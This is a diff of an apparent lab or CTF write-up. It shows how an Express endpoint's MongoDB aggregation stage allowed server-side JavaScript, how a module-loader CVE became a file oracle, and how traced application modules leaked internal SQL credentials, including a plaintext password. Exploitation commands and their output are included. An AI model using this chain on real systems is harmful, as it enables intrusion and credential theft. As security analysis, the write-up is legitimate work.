@@ -113,43 +113,80 @@ match_miss  status=200 count=0
 limit_one   status=200 count=1
 ```
 
+
 ### MongoDB JavaScript and file disclosure
 
-`$project` also accepted `$function`. Through this public Express route, that exposed MongoDB's server-side JavaScript. `buildInfo()` reported MongoDB `7.0.32`, a version covered by the [MongoDB module-loader file-disclosure advisory](https://www.mongodb.com/resources/products/alerts) for CVE-2026-13078. The database vulnerability normally assumes MongoDB access; the application supplied that access over HTTP. The module-loader test against `/etc/hostname` returned the hostname as a JavaScript error, confirming this particular file oracle.
+The accepted $project stage also allowed $function, so the public Express endpoint could execute JavaScript inside MongoDB’s embedded JavaScript engine. This was MongoDB JavaScript—not Node.js—and globals such as Node’s require were initially unavailable.
 
-```bash
+I first queried the runtime and tested the module loader against /etc/hostname:
+
 ./scripts/probe-mds-buildinfo.sh
 ./scripts/mongodb-module-read.sh hostname /etc/hostname
-```
 
 Condensed output:
 
-```text
 status=200
 version=7.0.32
 buildEnvironment.target_os=linux
 ReferenceError: odyssey is not defined
-```
 
-The file oracle led to `/home/webadmin/aegis`. The CommonJS tracer recovered route and configuration details, including a separate SQL connection:
+MongoDB 7.0.32 is covered by the MongoDB module-loader file-disclosure advisory (https://www.mongodb.com/resources/products/alerts) for CVE-2026-13078. The vulnerability normally requires access to MongoDB, but the application exposed the necessary aggregation operations over HTTP.
 
-```bash
+The hostname file contained the token odyssey. When the module loader read and interpreted that file as JavaScript, it treated odyssey as an undefined variable and returned it in a ReferenceError. This established an error-based file oracle rather than a general raw-file download primitive.
+
+The loader also produced distinguishable results for different path types:
+
+Missing path:          can't open for reading ...
+Existing directory:    Directory import ... is not supported
+Existing CommonJS:     require is not defined
+
+Testing candidate paths confirmed that /home/webadmin and /home/webadmin/aegis existed:
+
 ./scripts/probe-directory-candidates.sh
-./scripts/trace-commonjs-module.sh mongo /home/webadmin/aegis/db/mongo.js
-./scripts/trace-commonjs-module.sh webauthn /home/webadmin/aegis/routes/webauthn.js
-./scripts/trace-commonjs-module.sh sql /home/webadmin/aegis/db/sql.js
-```
 
-Useful values from the recovered configuration:
+Relevant output:
 
-```text
+/home/webadmin        Error: Directory import '/home/webadmin' is not supported
+/home/webadmin/aegis  Error: Directory import '/home/webadmin/aegis' is not supported
+
+Conventional Node.js module paths beneath that application directory were then tested. Existing CommonJS files reached their first Node-specific require() call before failing, confirming that MongoDB had read them.
+
+To inspect those modules beyond the initial failure, the CommonJS tracer supplied inert Proxy-based replacements for require, module, process.env, and external dependencies. The proxies recorded module imports, environment-variable access, route registrations, exported functions, and function arguments without establishing real MongoDB or SQL connections:
+
+./scripts/trace-commonjs-module.sh \
+  mongo /home/webadmin/aegis/db/mongo.js
+
+./scripts/trace-commonjs-module.sh \
+  webauthn /home/webadmin/aegis/routes/webauthn.js
+
+./scripts/trace-commonjs-module.sh \
+  sql /home/webadmin/aegis/db/sql.js
+
+The MongoDB trace exposed the local aegis_mds configuration, while the WebAuthn trace recovered the registration and authentication handlers used later. In db/sql.js, the tracer recorded the configuration passed to its mocked mssql.connect() call.
+
+The SQL values can be extracted from the saved trace with:
+
+jq -r '
+  .[0].probe as $p |
+  ($p.trace[] |
+    select(.op == "call" and .path == "require(mssql).connect") |
+    .args[0] | fromjson) as $c |
+  "application root=\($p.path | sub("/db/sql\\.js$"; ""))",
+  "SQL host=\($c.server)",
+  "SQL database=\($c.database)",
+  "SQL username=\($c.user)",
+  "SQL password=\($c.password)"
+' responses/cjs-trace-sql.body
+
+Output:
+
 application root=/home/webadmin/aegis
 SQL host=172.16.0.11
 SQL database=aegis
 SQL username=odyssey_app
 SQL password=opc0932k90%%lODFI93-++
-```
 
+Because the tracer’s process.env replacement returned no values, these are fallback settings embedded in the module source; they are not, by themselves, proof that the live Express process had no environment-variable overrides. The trace nevertheless disclosed the internal SQL host and the application’s default connection details.
 ## Foothold: WebAuthn Administrator session
 
 The recovered WebAuthn route showed that enrollment needed an active invite. With `$lookup` nested under `$facet`, the MDS endpoint could read the `pending_invites` collection:
